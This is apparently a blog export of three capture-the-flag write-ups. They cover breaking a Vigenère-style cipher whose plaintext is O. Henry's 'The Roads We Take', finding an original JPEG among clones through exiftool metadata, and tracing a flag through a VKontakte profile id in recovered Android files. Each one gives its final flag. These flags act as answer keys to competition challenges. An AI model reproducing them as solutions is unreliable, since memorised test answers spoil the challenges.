ZLCHSEWIBFMWGIMAEEJLUJSVJTJWPMVBBEWNHFPHDPJOKZCFJGATLVPIMTVEGZVJFRUOCIITLMODPVRBECOAJNJGONMWOIFOOMZPCZGZZMONGIWTJOBZCFLJNKLBZECONCOOQAEVMVPADGYFRLJJUKUVLBNOISSWWAYFVFYJMERLWYPDSCFUMWWTYFSIXMEJTWZVJNUPRDWISWBQPKCAEHSOQIAEJBDBVNKUCZVZOWDCWLAEIPQTBTMZOUWMYWZUVTVZXFSOMTZCLQWOQOYKISDWPLFGHSMHAETVZEZDZUGPTAFFSOXWHEEUZTSZAEFJTTAATFWYBCENJBOWROWBFPXPTRCZPPJUJFHCCGYSPPEQYBRMZHINNVWSCBJHZUHSMWRVFNPIBAZOHSMYEREZJ45WATYFTLTNEWSWPVYCIBQVMYAEETTTGEUUVPOJRXFKTBCAIPOCBCAKUVPEVLCTVFZGEUCONSRIKIWYLDGEBBEMXHFFGLVYBFMWGIMUEDCYAXIFVGLKXODQZTKZSNJTETTBFSSLEVYKISWINTFGHSMCOCESCAPPFGHSMNUETSEMSPIFGDVJTGVHEWOHVTHCMNSFGQLZMYZOUOWPBCFPFBVSJIOCSYOUTCYOVLCPDPLVWRZHSMROFEGDMZMVEHZNVDVGFZUCIJWWPEOHVSSGWGVVSWYPDSIJUSBCAEEHFZIEUUCEPZCLSJPLVRDPTLUVHFHOYGXHRJFSQNSRERWMRAJTHCIIGVMMFXCOCTHPZZDRORSMJPVOSOPDSVZSDIIDJBKSQNFVFHYWOIETHTZMUGTPFBMEJUWYOLUZFHWGJNKISPLBEFGOBCVRKFFPLJABESDSDADUSWTDNXZCFBCAKECOAJNFGHSMAIINCQLJDJPBOMXKVSKLTGSKSSPBWRFLSCAJPVOSOPDSVZSDXZASPRJBCETPBQQYEEUWLTXLVSYHINSKBBOQIGSZVTAXHRJFSMNIKBHTVBTFTDPIFTYFFPEVSRDCYNPSVEVFUJFNISPTNBVMCHIIDKISDMYAKJJPJPZQPTLVZLVDHCQXFROOSMHPVBPZLTSRJROWYSFOPWQIKZOUTUPSKIOGMAACMSYINLVFDTPVDRNCDBMEDBFVIWLVEFPIHWYBHTADTGFOMWYYDSKTTGIRNGDQMOWUFLKTWZMZTIHSZTCFBNIUFVPPVSTPAPBJSVUHWMCIJESLTDNOZNEPZMRSYPBXALHVEPDMJICCBNIIJTJWPRVNSXJZRPFGTZZMVNPPZRHRUWDFTZHVCEMYAKUCOITPVBPZLTOEFSTOCTPGWGMNIIUVPVOHRUGSQNPIJQPMSCLTSXMNAZEDPIWOUZFLBCEIOSCDJUJMMQWMSGFOVQIGFGWEJPTZWSMMZNKBZVQIGKPKTTGIRNGSMNAEPZONMIVORZNTOLSGXZYOUTCYIIDPPIAZVCKJQLTGYYBJPIXOIOSCQIXPAWEPJUXIHJWPMZHVEBCAKJGTBCOLHVEGJUDJUSBIOKSSXMHBVSHSIOHVTCWLTOLUVPAOOTLOE98QAHVTSEBGEJBHEPZMRSYPBKRZDSTBRICMHLSZEMFFJKZNKISSINIEUVPEJRCEOYLCIJICXMOOFUCOMGIMFFEPZSYBFPAOHVFLAZZSJJCYWIDFEGZVNFRDSNPVNXFRTVVNZOGEIITKPCYMJFTPZONZRFDWEGHIEHZPLRIKIWYMSOIBPWMXUGJRTBTTYFGZCGOWUVPUVNJICHMYIKTSWNAOIBAZUZNKMWVMVNVWWWNVCVJBEPZWZORZEJFRSSACOASMSSWPSVISHQGLJFHETZAKPBPMDGYUMQQQEJBWOLJDJPBMWGIMBFNIINFUQLZMYUPIMTZ A statistic analysis give us BOLIVOR as KEY, that's nearly the good one. At the begining of the clear text we can guess TWENTY MILES so by running a known text attack we found the true KEY: BOLIVAR. So the clear text is: 1TWENTYMILESWESTOFTUCSONTHESUNSETEXPRESSSTOPPEDATATANKTOTAKEONWATERBESIDESTHEAQUEOUSADDITIONTHEENGINEOFTHATFAMOUSFLYERACQUIREDSOMEOTHERTHINGSTHATWERENOTGOODFORITWHILETHEFIREMANWASLOWERINGTHEFEEDINGHOSEBOBTIDBALLSHARKDODSONANDAQUARTERBREDCREEKINDIANCALLEDJOHNBIGDOGCLIMBEDONTHEENGINEANDSHOWEDTHEENGINEERTHREEROUNDORIFICESINPIECESOFORDNANCETHATTHEYCARRIEDTHESEORIFICESSOIMPRESSEDTHEENGINEERWITHTHEIRPOSSIBILITIESTHATHERAISEDBOTHHANDSINAGESTURESUCHASACCOMPANIESTHEEJACULATIONDOTELLATTHECRISPCOMMANDOFSHARKDODSONWHOWASLEADEROFTHEATTACKINGFORCETHEENGINEERDESCENDEDTOTHEGROUNDANDUNCOUPLEDTHEENGINEANDTENDERTHENJOHNBIGDOGPERCHEDUPONTHECOALSPORTIVELYHELDTWOGUNSUPONTHEENGINEDRIVERANDTHEFIREMANANDSUGGESTEDTHATTHEYRUNTHEENGINEFIFTYYARDSAWAYANDTHEREAWAITFURTHERORDERSSHARKDODSONANDBOBTIDBALLSCORNINGTOPUTSUCHLOWGRADEOREASTHEPASSENGERSTHROUGHTHEMILLSTRUCKOUTFORTHERICHPOCKETOFTHEEXPRESSCARTHEYFOUNDTHEMESSENGERSERENEINTHEBELIEFTHATTHESUNSETEXPRESSWASTAKINGONNOTHINGMORESTIMULATINGANDDANGEROUSTHANAQUAPURAWHILEBOBWASKNOCKINGTHISIDEAOUTOFHISHEADWITHTHEBUTTENDOFHISSIXSHOOTERSHARKDODSONWASALREADYDOSINGTHEEXPRESSCARSAFEWITHDYNAMITETHESAFEEXPLODEDTOTHETUNEOF30000ALLGOLDANDCURRENCYTHEPASSENGERSTHRUSTTHEIRHEADSCASUALLYOUTOFTHEWINDOWSTOLOOKFORTHETHUNDERCLOUDTHECONDUCTORJERKEDATTHEBELLROPEWHICHSAGGEDDOWNLOOSEANDUNRESISTINGATHISTUGSHARKDODSONANDBOBTIDBALLWITHTHEIRBOOTYINASTOUTCANVASBAGTUMBLEDOUTOFTHEEXPRESSCARANDRANAWKWARDLYINTHEIRHIGHHEELEDBOOTSTOTHEENGINETHEENGINEERSULLENLYANGRYBUTWISERANTHEENGINEACCORDINGTOORDERSRAPIDLYAWAYFROMTHEINERTTRAINBUTBEFORETHISWASACCOMPLISHEDTHEEXPRESSMESSENGERRECOVEREDFROMBOBTIDBALLSPERSUADERTONEUTRALITYJUMPEDOUTOFHISCARWITHAWINCHESTERRIFLEANDTOOKATRICKINTHEGAMEMRJOHNBIGDOGSITTINGONTHECOALTENDERUNWITTINGLYMADEAWRONGLEADBYGIVINGANIMITATIONOFATARGETANDTHEMESSENGERTRUMPEDHIMWITHABALLEXACTLYBETWEENHISSHOULDERBLADESTHECREEKCHEVALIEROFINDUSTRYROLLEDOFFTOTHEGROUNDTHUSINCREASINGTHESHAREOFHISCOMRADESINTHELOOTBYONESIXTHEACHTWOMILESFROMTHETANKTHEENGINEERWASORDEREDTOSTOPTHEROBBERSWAVEDADEFIANTADIEUANDPLUNGEDDOWNTHESTEEPSLOPEINTOTHETHICKWOODSTHATLINEDTHETRACKFIVEMINUTESOFCRASHINGTHROUGHATHICKETOFCHAPARRALBROUGHTTHEMTOOPENWOODSWHERETHREEHORSESWERETIEDTOLOWHANGINGBRANCHESONEWASWAITINGFORJOHNBIGDOGWHOWOULDNEVERRIDEBYNIGHTORDAYAGAINTHISANIMALTHEROBBERSDIVESTEDOFSADDLEANDBRIDLEANDSETFREETHEYMOUNTEDTHEOTHERTWOWITHTHEBAGACROSSONEPOMMELANDRODEFASTANDWITHDISCRETIONTHROUGHTHEFORESTANDUPAPRIMEVALLONELYGORGEHERETHEANIMALTHATBOREBOBTIDBALLSLIPPEDONAMOSSYBOULDERANDBROKEAFORELEGTHEYSHOTHIMTHROUGHTHEHEADATONCEANDSATDOWNTOHOLDACOUNCILOFFLIGHTMADESECUREFORTHEPRESENTBYTHETORTUOUSTRAILTHEYHADTRAVELLEDTHEQUESTIONOFTIMEWASNOLONGERSOBIGMANYMILESANDHOURSLAYBETWEENTHEMANDTHESPRYESTPOSSETHATCOULDFOLLOWSHARKDODSONSHORSEWITHTRAILINGROPEANDDROPPEDBRIDLEPANTEDANDCROPPEDTHANKFULLYOFTHEGRASSALONGTHESTREAMINTHEGORGEBOBTIDBALLOPENEDTHESACKDREWOUTDOUBLEHANDFULSOFTHENEATPACKAGESOFCURRENCYANDTHEONESACKOFGOLDANDCHUCKLEDWITHTHEGLEEOFACHILDSAYYOUOLDDOUBLEDECKEDPIRATEHECALLEDJOYFULLYTODODSONYOUSAIDWECOULDDOITYOUGOTAHEADFORFINANCINGTHATKNOCKSTHEHORNSOFFOFANYTHINGINARIZONAWHATAREWEGOINGTODOABOUTAHOSSFORYOUBOBWEAINTGOTLONGTOWAITHERETHEYLLBEONOURTRAILBEFOREDAYLIGHTINTHEMORNINOHIGUESSTHATCAYUSEOFYOURNLLCARRYDOUBLEFORAWHILEANSWEREDTHESANGUINEBOBWELLANNEXTHEFIRSTANIMALWECOMEACROSSBYJINGOESWEMADEAHAULDIDNTWEACCORDINTOTHEMARKSONTHISMONEYTHERES3000015000APIECEITSSHORTOFWHATIEXPECTEDSAIDSHARKDODSONKICKINGSOFTLYATTHEPACKAGESWITHTHETOEOFHISBOOTANDTHENHELOOKEDPENSIVELYATTHEWETSIDESOFHISTIREDHORSEOLDBOLIVARSMIGHTYNIGHPLAYEDOUTHESAIDSLOWLYIWISHTHATSORRELOFYOURSHADNTGOTHURTSODOISAIDBOBHEARTILYBUTITCANTBEHELPEDBOLIVARSGOTPLENTYOFBOTTOMHELLGETUSBOTHFARENOUGHTOGETFRESHMOUNTSDANGITSHARKICANTHELPTHINKINHOWFUNNYITISTHATANEASTERNERLIKEYOUCANCOMEOUTHEREANDGIVEUSWESTERNFELLOWSCARDSANDSPADESINTHEDESPERADOBUSINESSWHATPARTOFTHEEASTWASYOUFROMANYWAYNEWYORKSTATESAIDSHARKDODSONSITTINGDOWNONABOULDERANDCHEWINGATWIGIWASBORNONAFARMINULSTERCOUNTYIRANAWAYFROMHOMEWHENIWASSEVENTEENITWASANACCIDENTMYCOMINGWESTIWASWALKINALONGTHEROADWITHMYCLOTHESINABUNDLEMAKINFORNEWYORKCITYIHADANIDEAOFGOINTHEREANDMAKINLOTSOFMONEYIALWAYSFELTLIKEICOULDDOITICAMETOAPLACEONEEVENINWHERETHEROADFORKEDANDIDIDNTKNOWWHICHFORKTOTAKEISTUDIEDABOUTITFORHALFANHOURANDTHENITOOKTHELEFTHANDTHATNIGHTIRUNINTOTHECAMPOFAWILDWESTSHOWTHATWASTRAVELLINAMONGTHELITTLETOWNSANDIWENTWESTWITHITIVEOFTENWONDEREDIFIWOULDNTHAVETURNEDOUTDIFFERENTIFIDTOOKTHEOTHERROADOHIRECKONYOUDHAVEENDEDUPABOUTTHESAMESAIDBOBTIDBALLCHEERFULLYPHILOSOPHICALITAINTTHEROADSWETAKEITSWHATSINSIDEOFUSTHATMAKESUSTURNOUTTHEWAYWEDOSHARKDODSONGOTUPANDLEANEDAGAINSTATREEIDAGOODDEALRATHERTHATSORRELOFYOURNHADNTHURTHIMSELFBOBHESAIDAGAINALMOSTPATHETICALLYSAMEHEREAGREEDBOBHEWASSUREAFIRSTRATEKINDOFACROWBAITBUTBOLIVARHELLPULLUSTHROUGHALLRIGHTRECKONWEDBETTERBEMOVINONHADNTWESHARKILLBAGTHISBOODLEAGINANDWELLHITTHETRAILFORHIGHERTIMBERBOBTIDBALLREPLACEDTHESPOILINTHEBAGANDTIEDTHEMOUTHOFITTIGHTLYWITHACORDWHENHELOOKEDUPTHEMOSTPROMINENTOBJECTTHATHESAWWASTHEMUZZLEOFSHARKDODSONS45HELDUPONHIMWITHOUTAWAVERSTOPYOURFUNNINSAIDBOBWITHAGRINWEGOTTOBEHITTINTHEBREEZESETSTILLSAIDSHARKYOUAINTGOINTOHITNOBREEZEBOBIHATETOTELLYOUBUTTHEREAINTANYCHANCEFORBUTONEOFUSBOLIVARHESPLENTYTIREDANDHECANTCARRYDOUBLEWEBEENPARDSMEANDYOUSHARKDODSONFORTHREEYEARBOBSAIDQUIETLYWEVERISKEDOURLIVESTOGETHERTIMEANDAGAINIVEALWAYSGIVEYOUASQUAREDEALANDITHOUGHTYOUWASAMANIVEHEARDSOMEQUEERSTORIESABOUTYOUSHOOTINONEORTWOMENINAPECULIARWAYBUTINEVERBELIEVEDEMNOWIFYOUREJUSTHAVINALITTLEFUNWITHMESHARKPUTYOURGUNUPANDWELLGETONBOLIVARANDVAMOSEIFYOUMEANTOSHOOTSHOOTYOUBLACKHEARTEDSONOFATARANTULASHARKDODSONSFACEBOREADEEPLYSORROWFULLOOKYOUDONTKNOWHOWBADIFEELHESIGHEDABOUTTHATSORRELOFYOURNBREAKINHISLEGBOBTHEEXPRESSIONONDODSONSFACECHANGEDINANINSTANTTOONEOFCOLDFEROCITYMINGLEDWITHINEXORABLECUPIDITYTHESOULOFTHEMANSHOWEDITSELFFORAMOMENTLIKEANEVILFACEINTHEWINDOWOFAREPUTABLEHOUSETRULYBOBTIDBALLWASNEVERTOHITTHEBREEZEAGAINTHEDEADLY45OFTHEFALSEFRIENDCRACKEDANDFILLEDTHEGORGEWITHAROARTHATTHEWALLSHURLEDBACKWITHINDIGNANTECHOESANDBOLIVARUNCONSCIOUSACCOMPLICESWIFTLYBOREAWAYTHELASTOFTHEHOLDERSUPOFTHESUNSETEXPRESSNOTPUTTOTHESTRESSOFCARRYINGDOUBLEBUTASSHARKDODSONGALLOPEDAWAYTHEWOODSSEEMEDTOFADEFROMHISVIEWTHEREVOLVERINHISRIGHTHANDTURNEDTOTHECURVEDARMOFAMAHOGANYCHAIRHISSADDLEWASSTRANGELYUPHOLSTEREDANDHEOPENEDHISEYESANDSAWHISFEETNOTINSTIRRUPSBUTRESTINGQUIETLYONTHEEDGEOFAQUARTEREDOAKDESKIAMTELLINGYOUTHATDODSONOFTHEFIRMOFDODSONDECKERWALLSTREETBROKERSOPENEDHISEYESPEABODYTHECONFIDENTIALCLERKWASSTANDINGBYHISCHAIRHESITATINGTOSPEAKTHEREWASACONFUSEDHUMOFWHEELSBELOWANDTHESEDATIVEBUZZOFANELECTRICFANAHEMPEABODYSAIDDODSONBLINKINGIMUSTHAVEFALLENASLEEPIHADAMOSTREMARKABLEDREAMWHATISITPEABODYMRWILLIAMSSIROFTRACYWILLIAMSISOUTSIDEHEHASCOMETOSETTLEHISDEALINXYZTHEMARKETCAUGHTHIMSHORTSIRIFYOUREMEMBERYESIREMEMBERWHATISXYZQUOTEDATTODAYPEABODYONEEIGHTYFIVESIRTHENTHATSHISPRICEEXCUSEMESAIDPEABODYRATHERNERVOUSLYFORSPEAKINGOFITBUTIVEBEENTALKINGTOWILLIAMSHESANOLDFRIENDOFYOURSMRDODSONANDYOUPRACTICALLYHAVEACORNERINXYZITHOUGHTYOUMIGHTTHATISITHOUGHTYOUMIGHTNOTREMEMBERTHATHESOLDYOUTHESTOCKAT98IFHESETTLESATTHEMARKETPRICEITWILLTAKEEVERYCENTHEHASINTHEWORLDANDHISHOMETOOTODELIVERTHESHARESTHEEXPRESSIONONDODSONSFACECHANGEDINANINSTANTTOONEOFCOLDFEROCITYMINGLEDWITHINEXORABLECUPIDITYTHESOULOFTHEMANSHOWEDITSELFFORAMOMENTLIKEANEVILFACEINTHEWINDOWOFAREPUTABLEHOUSEHEWILLSETTLEATONEEIGHTYFIVESAIDDODSONBOLIVARCANNOTCARRYDOUBLE BOLIVAR is not the flag. Let's quickly look over the text, but we don't want to spend too much time adding, so we fount the original text (Whirligigs, O. Henry, Chapter XIV, THE ROADS WE TAKE, page 82). Because HTML is better than PDF (http://www.hymnsandcarolsofchristmas.com/Text/8whrl11h.htm#14): TWENTY miles West of Tucson, the &quot;Sunset Express&quot; stopped at a tank to take on water. Besides the aqueous, addition the engine of that famous flyer acquired some other things that were not good for it. While the fireman was lowering the feeding hose, Bob Tidball, &quot;Shark&quot; Dodson and a quarter-bred Creek Indian called John Big Dog climbed on the engine and showed the engineer three round orifices in pieces of ordnance that the carried. These orifices so impressed the engineer with their possibilities that he raised both hands in a gesture such as accompanies the ejaculation &quot;Do tell!&quot; At the crisp command of Shark Dodson, who was leader of the attacking force the engineer descended to the ground and uncoupled the engine and tender. Then John Big Dog, perched upon the coal, sportively held two guns upon the engine driver and the fireman, and suggested that they run the engine fifty yards away and there await further orders. Shark Dodson and Bob Tidball, scorning to put such low-grade ore as the passengers through the mill, struck out for the rich pocket of the express car. They found the messenger serene in the belief that the &quot;Sunset Express&quot; was taking on nothing more stimulating and dangerous than aqua pura. While Bob was knocking this idea out of his head with the butt-end of his six-shooter Shark Dodson was already dosing the express-car safe with dynamite. The safe exploded to the tune of $30,000, all gold and currency. The passengers thrust their heads casually out of the windows to look for the thunder-cloud. The conductor jerked at the bell-rope, which sagged down loose and unresisting, at his tug. Shark Dodson and Bob Tidball, with their booty in a stout canvas bag, tumbled out of the express car and ran awkwardly in their high-heeled boots to the engine. The engineer, sullenly angry but wise, ran the engine, according to orders, rapidly away from the inert train. But before this was accomplished the express messenger, recovered from Bob Tidball's persuader to neutrality, jumped out of his car with a Winchester rifle and took a trick in the game. Mr. John Big Dog, sitting on the coal tender, unwittingly made a wrong lead by giving an imitation of a target, and the messenger trumped him. With a ball exactly between his shoulder blades the Creek chevalier of industry rolled off to the ground, thus increasing the share of his comrades in the loot by one-sixth each. Two miles from the tank the engineer was ordered to stop. The robbers waved a defiant adieu and plunged down the steep slope into the thick woods that lined the track. Five minutes of crashing through a thicket of chapparal brought them to open woods, where three horses were tied to low-hanging branches. One was waiting for John Big Dog, who would never ride by night or day again. This animal the robbers divested of saddle and bridle and set free. They mounted the other two with the bag across one pommel, and rode fast and with discre- tion through the forest and up a primeval, lonely gorge. Here the animal that bore Bob Tidball slipped on a mossy boulder and broke a foreleg. They shot him through the head at once and sat down to hold a council of flight. Made secure for the present by the tortuous trail they- had travelled, the question of time was no longer so big. Many miles and hours lay between them and the spryest posse that could follow. Shark Dodson's horse, with trailing rope and dropped bridle, panted and cropped thankfully of the grass along the stream in the gorge. Bob Tidball opened the sack, drew out double handfuls of the neat packages of currency and the one sack of gold and chuckled with the glee of a child. &quot;Say, you old double-decked pirate,&quot; he called joyfully to Dodson, &quot;you said we could do it -- you got a head for financing that knocks the horns off of anything in Arizona.&quot; &quot;What are we going to do about a hoss for you, Bob? We ain't got long to wait here. They'll be on our trail before daylight in the mornin'.&quot; &quot;Oh, I guess that cayuse of yourn'll carry double for a while,&quot; answered the sanguine Bob. &quot;We'll annex the first animal we come across. By jingoes, we made a haul, didn't we? Accordin' to the marks on this money there's $30,000 -- $15,000 apiece!&quot; &quot;It's short of what I expected,&quot; said Shark Dodson, kicking softly at the packages with the toe of his boot and then he looked pensively at the wet sides of his tired horse. &quot;Old Bolivar's mighty nigh played out,&quot; he said, slowly. &quot;I wish that sorrel of yours hadn't got hurt.&quot; &quot;So do I,&quot; said Bob, heartily, &quot;but it can't be helped. Bolivar's got plenty of bottom -- he'll get us both far enough to get fresh mounts. Dang it, Shark, I can't belp thinkin' how funny it is that an Easterner like you can come out here and give us Western fellows cards and spades in the desperado business. What part of the East was you from, anyway?&quot; &quot;New York State,&quot; said Shark Dodson, sitting down on a boulder and chewing a twig. &quot;I was born on a farm in Ulster County. I ran away from home when I was seventeen. It was an accident my coming West. I was walkin' along the road with my clothes in a bundle, makin' for New York City. I had an idea of goin' there and makin' lots of money. I always felt like I could do it. I came to a place one evenin' where the road forked and I didn't know which fork to take. I studied about it for half an hour, and then I took the left- hand. That night I run into the camp of a Wild West show that was travellin' among the little towns, and I went West with it. I've often wondered if I wouldn't have turned out different if I'd took the other road.&quot; &quot;Oh, I reckon you'd have ended up about the same,&quot; said Bob Tidball, cheerfully philosophical. &quot;It ain't the roads we take; it's what's inside of us that makes us turn out the way we do.&quot; Shark Dodson got up and leaned against a tree. &quot;I'd a good deal rather that sorrel of yourn hadn't hurt himself, Bob,&quot; he said again, almost pathetically. &quot;Same here,&quot; agreed Bob; &quot;he was sure a first-rate kind of a crowbait. But Bolivar, he'll pull us through all right. Reckon we'd better be movin' on, hadn't we, Shark? I'll bag this boodle ag'in and we'll hit the trail for higher timber.&quot; Bob Tidball replaced the spoil in the bag and tied the mouth of it tightly with a cord. When he looked up the most prominent object that he saw was the muzzle of Shark Dodson's .45 held upon him without a waver. &quot;Stop your funnin',&quot; said Bob, with a grin. &quot;We got to be hittin' the breeze.&quot; &quot;Set still,&quot; said Shark. &quot;You ain't goin' to hit no breeze, Bob. I hate to tell you, but there ain't any chance for but one of us. Bolivar, he's plenty tired, and he can't carry double.&quot; &quot;We been pards, me and you, Shark Dodson, for three year,&quot; Bob said quietly. &quot;We've risked our lives together time and again. I've always give you a square deal, and I thought you was a man. I've heard some queer stories about you shootin' one or two men in a peculiar way, but I never believed 'em. Now if you're just havin' a little fun with me, Shark, put your gun up, and we'll get on Bolivar and vamose. If you mean to shoot -- shoot, you blackhearted son of a tarantula!&quot; Shark Dodson's face bore a deeply sorrowful look. &quot;You don't know how bad I feel,&quot; he sighed, &quot;about that sorrel of yourn breakin' his leg, Bob.&quot; The expression on Dodson's face changed in an instant to one of cold ferocity mingled with inexorable cupidity. The soul of the man showed itself for a moment like an evil face in the window of a reputable house. Truly Bob Tidball was never to &quot;hit the breeze&quot; again. The deadly .45 of the false friend cracked and filled the gorge with a roar that the walls hurled back with indignant echoes. And Bolivar, unconscious accomplice, swiftly bore away the last of the holders-up of the &quot;Sunset Express,&quot; not put to the stress of &quot;carrying double.&quot; But as &quot;Shark&quot; Dodson galloped away the woods seemed to fade from his view; the revolver in his right hand turned to the curved arm of a mahogany chair; his saddle was strangely upholstered, and he opened his eyes and saw his feet, not in stirrups, but resting quietly on the edge of a quartered-oak desk. I am telling you that Dodson, of the firm of Dodson &amp; Decker, Wall Street brokers, opened his eyes. Peabody, the confidential clerk, was standing by his chair, hesitating to speak. There was a confused hum of wheels below, and the sedative buzz of an electric fan. &quot;Ahem! Peabody,&quot; said Dodson, blinking. &quot;I must have fallen asleep. I had a most remarkable dream. What is it, Peabody?&quot; &quot;Mr. Williams, sir, of Tracy &amp; Williams, is outside. He has come to settle his deal in X. Y. Z. The market caught him short, sir, if you remember.&quot; &quot;Yes, I remember. What is X. Y. Z. quoted at to-day, Peabody?&quot; &quot;One eighty-five, sir.&quot; &quot;Then that's his price.&quot; &quot;Excuse me,&quot; said Peabody, rather nervously &quot;for speaking of it, but I've been talking to Williams. He's an old friend of yours, Mr. Dodson, and you practically have a corner in X. Y. Z. I thought you might -- that is, I thought you might not remember that he sold you the stock at 98. If he settles at the market price it will take every cent he has in the world and his home too to deliver the shares.&quot; The expression on Dodson's face changed in an instant to one of cold ferocity mingled with inexorable cupidity. The soul of the man showed itself for a moment like an evil face in the window of a reputable house. &quot;He will settle at one eighty-five,&quot; said Dodson. &quot;Bolivar cannot carry double.&quot; Description said the end was very important so we tried BOLIVARCANNOTCARRYDOUBLE as flag. And that was the one. Feedback: no flag format, flag are meaningless so it may be hard to know when you get the flag or not, they need to use a flag format or give in the description what the flag have to look like, here we just known that was at the end","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Juniors CTF - 200 - Clone Attack - Forensics","slug":"JuniorCTF-2016-forensics-clone-attack","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:36.962Z","comments":true,"path":"en/JuniorCTF-2016-forensics-clone-attack/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-forensics-clone-attack/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description categories: trivial, forensics Gravity Falls is under clones attack. Find the real Dipper and save the town https://yadi.sk/d/ekEIo3nwy22JC, http://juniors.ucoz.net/dipper2.png Lupanov M.Iu.&lt;br&gt;&lt;br&gt; Solution dipper2.jpg is useless. unzip dipper.7z We have 201 images: 12345678[...]Ab9t2MDhgeCdtIWM.jpg HjBQKJSOhcieolm4.jpg n3dQQ0ZDx3S3UsBr.jpg T1uPfBLnZwT4gnLy.jpg zaDSq7pwGh4a38xy.jpgABDOzIFq6epnCnhx.jpg hk0hHu8tI5DkDyiV.jpg N4M2CtJ7gr7Jzo9S.jpg t1xoHMAR0IAkwfd7.jpg Zb1RJWvpVjXFKfxq.jpgaBHn54lpn0JuymBI.jpg HKjCtFdy5EL15cXH.jpg N5muaN8pZFaQizT6.jpg t2FNLj2HOKnT1naO.jpg ZcAZFv16zVB2Xoih.jpgAbmIxXZ4ReLk7UYM.jpg hlB31hrzrOU5RYQg.jpg N5ZGl2k84vyFp5Br.jpg t3sXG01KznKJiN9v.jpg zCYJB6XDGlt8UB58.jpgABNclrsAR0By1bUx.jpg HLIqYcwvszKfJ2mh.jpg n6bfa5irSSBzz1IU.jpg t9IRCSMIJBrvArav.jpg zD3o8PsmbXmRWNON.jpgac9q61SRl4vlF0td.jpg hmrrHYgpxaW6V6XU.jpg n6BS4SVXzrkIRpsu.jpg TBHJwtjbcXh2GYv9.jpg zdd9UFYGdxytCbCz.jpg[...] Let's take a look at the first image: 12345678910111213141516171819202122232425262728293031[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]$ exiftool 07snLOxf2k0rRrT3.jpgExifTool Version Number : 10.20File Name : 07snLOxf2k0rRrT3.jpgDirectory : .File Size : 26 kBFile Modification Date/Time : 2016:11:03 04:56:07+01:00File Access Date/Time : 2016:11:25 16:47:44+01:00File Inode Change Date/Time : 2016:11:25 16:48:53+01:00File Permissions : rw-r--r--File Type : JPEGFile Type Extension : jpgMIME Type : image/jpegJFIF Version : 1.01Resolution Unit : inchesX Resolution : 72Y Resolution : 72Current IPTC Digest : 1f6df1813fc08f735211d55b866d1ccaCoded Character Set : UTF8Envelope Record Version : 4Object Name : Ксерокопия номер 086Application Record Version : 4Comment : Flag is MD5sum of this file. Its TRUEImage Width : 193Image Height : 400Encoding Process : Progressive DCT, Huffman codingBits Per Sample : 8Color Components : 3Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1)Image Size : 193x400Megapixels : 0.077 Comment : Flag is MD5sum of this file. Its TRUE but all images have the same comment. Object Name : Ксерокопия номер 086 means n° of copie 086, let's fidn teh original: 1234567[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]$ exiftool * | grep &apos;Object Name&apos;[...]Object Name : Ксерокопия номер 644Object Name : Оригинальный ДипперObject Name : Ксерокопия номер 702[...] We found it, Оригинальный Диппер means The original Dipper: 123456[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]$ grep -r &apos;Оригинальный Диппер&apos; ./Binary file ./atvF2wf1tfB2IkuV.jpg matches[noraj@rawsec]––––––––––––––––––––––––[~/CTF/JuniorCTF/2016/Clone-Attack/dipper]$ md5sum atvF2wf1tfB2IkuV.jpgcd4d19b8471cecbc8ea7544de59db368 atvF2wf1tfB2IkuV.jpg cd4d19b8471cecbc8ea7544de59db368 was the flag. Feedback: it's a international CTF, so please use only english, russian content everywhere is pain for non-russian","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"Juniors CTF - 500 - Lost everything but hope - Forensics","slug":"JuniorCTF-2016-forensics-Lost-everything-but-hope","date":"2016-11-26T23:00:00.000Z","updated":"2017-02-07T18:23:37.018Z","comments":true,"path":"en/JuniorCTF-2016-forensics-Lost-everything-but-hope/","link":"","permalink":"https://rawsec.ml/en/JuniorCTF-2016-forensics-Lost-everything-but-hope/","excerpt":"","text":"Informations Version By Version Comment Chill3d 1.0 Creation CTF Name : Juniors CTF 2016 Website : juniors.ctf.org.ru Type : Online Format : Jeopardy CTF Time : link Description screams Mabel: What's up, Gruncle??? Stan: I left a phone here and went to the store to sell something useless. When I got back I saw this shows a broken mobile Mabel: OMG! Soos: Gonna get some insulating tape. Stan: Restore the justice! A few hours later Dipper: Hm, who could do this?.. Soos, I managed to restore some files, maybe you can help to find something. Will you? Soos: Of course, Dipper. Solution We have a something.rar file, and in it, there is a sdcard folder. If we open it, we find data from an Android phone. After searching on the each folders, admin gave a hint on Telegram : Someone who likes vkontakte. So I opened the .vkontakte folder and search any clue. There was an ogg file named 397087112_439151831 with size of 1Ko so we couldn't listen anything. I had the idea that a audio conversation must be between 2 account of vkontakt so the numbers are reprenting an id of these account... Let's see if we can get a profile page of these accounts on vk.com :smirk: ! Go on https://vk.com/id397087112, we find a profile page of a pig nammed Waddles Mabelpig. This pig posted on the social network the flag ! Flag: waddles_the_d3stroyer 